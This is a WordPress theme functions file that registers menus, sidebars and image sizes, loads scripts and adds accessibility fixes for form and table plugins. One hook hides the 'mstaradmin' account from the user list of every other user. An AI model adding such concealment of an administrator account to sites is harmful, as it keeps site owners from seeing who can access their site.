<?php 
defined('ABSPATH') OR exit;
/**
 * @package WordPress
 * @subpackage WP-Skeleton
 */

// drag and drop menu support
//unregister_nav_menu( $location ); <-- registered menus be unregistered (load theme once) if eliminating
register_nav_menu( 'primary', 'Primary Menu' );
register_nav_menu( 'topnav', 'Top Nav' );
register_nav_menu( 'footer-left', 'Left Footer Nav' );
register_nav_menu( 'footer-right', 'Right Footer Nav' );
register_nav_menu( 'staff-portal', 'Staff Portal Nav' );
register_nav_menu( 'student-portal', 'Student Portal Nav' );
register_nav_menu( 'resource-nav', 'Resource Nav' );

//widget support for a right sidebar
register_sidebar(array(
  'name' => 'Right SideBar',
  'id' => 'right-sidebar',
  'description' => 'Widgets in this area will be shown on the right-hand side.',
  'before_widget' => '<div id="%1$s">',
  'after_widget'  => '</div>',  
  'before_title' => '<h3>',
  'after_title' => '</h3>'
));

//widget support for the footer
register_sidebar(array(
  'name' => 'Footer SideBar',
  'id' => 'footer-sidebar',
  'description' => 'Widgets in this area will be shown in the footer.',
  'before_widget' => '<div id="%1$s">',
  'after_widget'  => '</div>',
  'before_title' => '<h3>',
  'after_title' => '</h3>'
));

//This theme uses post thumbnails
add_theme_support( 'post-thumbnails' );
add_image_size( 'featured-image', 300, 350, true);
add_image_size( 'video-thumb', 300, 185, true);
add_image_size( 'video-sm-thumb', 150, 93, true);
add_image_size( 'story-thumb', 365, 276, true);
add_image_size( 'blog-thumb', 500, 500, true);
add_image_size( 'small-thumb', 100, 100, true);
add_image_size( 'landing-page-img', 830, 400, true);


//Apply do_shortcode() to widgets so that shortcodes will be executed in widgets
add_filter('widget_text', 'do_shortcode');


//Hide MStar as a user
add_action('pre_user_query','mstar_pre_user_query');
function mstar_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	
	if ($username != 'mstaradmin') { 
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'mstaradmin'",$user_search->query_where);
	}
}

//Force WordPress to load JS asyncronously
function mstar_async_scripts($url) {
	if (strpos($url, '#asyncload') === false){
		return $url;
	} else if ( is_admin() ) {
		return str_replace('#asyncload', '', $url);
	} else {
		return str_replace('#asyncload', '', $url) . "' async='async";
	}
}
add_filter( 'clean_url', 'mstar_async_scripts', 11, 1 );

//Add jquery Library
if (!is_admin()) add_action("wp_enqueue_scripts", "mstar_jquery_enqueue", 11);
function mstar_jquery_enqueue() {
	wp_deregister_script('jquery');
	wp_register_script('jquery', "http" . ($_SERVER['SERVER_PORT'] == 443 ? "s" : "") . "://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js", false, null);
	wp_enqueue_script('detect', get_template_directory_uri().'/includes/js/mobile-detect.js#asyncload', array( 'jquery' ) );
	wp_enqueue_script('jquery');
	wp_enqueue_script('navigation', get_template_directory_uri().'/includes/js/navigation.js', array(), '1.0.0', true );
	wp_enqueue_script('customjs', get_template_directory_uri().'/includes/js/custom.js', array('jquery'), '1.0.0', true );
}


//Adds Customizer functinality
function mytheme_customize_register( $wp_customize ){
	require_once( get_stylesheet_directory() . '/includes/customizer.php' );
}
add_action( 'customize_register', 'mytheme_customize_register' );





include('includes/custom_login_functions.php');
include('includes/general_functions.php');
include('includes/tinymce_functions.php');
include('includes/excerpt_functions.php');
include('includes/tracker_functions.php');
include('includes/upload_functions.php');
include('includes/form_functions.php');
include('includes/cpt_functions.php'); 	//-- use for custom post types
include('includes/menus.php');
include('includes/acf.php');

//include('includes/twitter_loader.php'); 	//-- call within page, not functions!
//include('includes/facebook_feed.php');  	//-- call within page, not functions!
//include('includes/fancy_loader.php');   	//-- call within page, not functions!

/**
 * Helper function to replace the first occurence of a string.
 *
 * @param  mixed $search
 * @param  mixed $replace
 * @param  mixed $subject
 * @return void
 */
function str_replace_first($search, $replace, $subject) {
    $search = '/'.preg_quote($search, '/').'/';
    return preg_replace( $search, $replace, $subject, 1 );
}
/**
 * By default, Gravity Forms isn't accessible. This function adds a fieldset and legend to checkbox fields.
 *
 * @param  mixed $content
 * @param  mixed $field
 * @param  mixed $value
 * @param  mixed $lead_id
 * @param  mixed $form_id
 * @return void
 */
function add_fields_wrapper( $content, $field, $value, $lead_id, $form_id ) {
	if ( 'checkbox' === $field->type ) {
		$content = str_replace_first( '<label', '<legend class="reset-legend"><label', $content );
		$content = str_replace_first( '</label>', '</label></legend>', $content );
		$content = '<fieldset>' . $content . '</fieldset>';
	}
	return $content;
}
add_filter( 'gform_field_content', 'add_fields_wrapper', 10, 5 );

/**
 * By default, Gravity Forms isn't accessible. This function adds autocomplete attributes to fields.
 *
 * @param  mixed $content
 * @param  mixed $field
 * @param  mixed $value
 * @param  mixed $lead_id
 * @param  mixed $form_id
 * @return void
 */
function acco_add_fields_wrapper( $content, $field, $value, $lead_id, $form_id ) {
	$lookup = array(
		2 => 'name',
		3 => 'tel',
	);
	$regex = '/\<(?:input|select|textarea)\s+[^\>]+?(\s*\/?\>){1}/im';
	if ( preg_match( $regex, $content, $input ) ) {
		$attribute    = $lookup[ $field->id ];
		$autocomplete = sprintf( ' autocomplete="%s"', esc_attr( $attribute ) );
		$element      = str_replace( $input[1], $autocomplete . $input[1], $input[0] );
		$content      = str_replace( $input[0], $element, $content );
	}
	return $content;
}
add_filter( 'gform_field_content_5', 'acco_add_fields_wrapper', 10, 5 );


/**
 * Add scope attributes to table cells using the tablepress_cell_tag_attributes filter.
 * Adds scope="col" to the first row items if the table has a head, and scope="row" to the first column item.
 *
 * @param array  $tag_attributes Array of tag attributes for the table cell.
 * @param int    $table_id       ID of the table.
 * @param string $cell_content   Content of the table cell.
 * @param int    $row_number     Row number of the table cell.
 * @param int    $col_number     Column number of the table cell.
 * @param int    $colspan        Number of columns spanned by the table cell.
 * @param int    $rowspan        Number of rows spanned by the table cell.
 *
 * @return array Modified array of tag attributes.
 */
function ada_tablepress_add_scope( $tag_attributes, $table_id, $cell_content, $row_number, $col_number, $colspan, $rowspan ) {
	$table = TablePress::$model_table->load( $table_id, true, true );

	// Check if the table loading resulted in an error
	if ( is_wp_error( $table ) ) {
		return $tag_attributes;
	}

	// Add scope="col" to the first row items if the table has a head
	if ( $row_number === 1 && $table['options']['table_head'] ) {
		$tag_attributes['scope'] = 'col';
	} else if ( $col_number === 1 && $row_number === 1 && ! $table['options']['table_head'] ) {
		$tag_attributes['scope'] = 'row';
	}

	// Add scope="row" to the first column item
	if ( $col_number === 1 && $row_number !== 1 ) {
		$tag_attributes['scope'] = 'row';
	}

	return $tag_attributes;
}
add_filter( 'tablepress_cell_tag_attributes', 'ada_tablepress_add_scope', 10, 7 );
add_image_size( 'team-member', 300, 300, true );
add_action( 'enqueue_block_assets', 'mstar_block_admin_editor_styles' );
function mstar_block_admin_editor_styles() {
	wp_enqueue_style( 'mstar-block-editor-styles', get_template_directory_uri(). '/stylesheets/editor.css', false, '1.0', 'all' );
}
?>
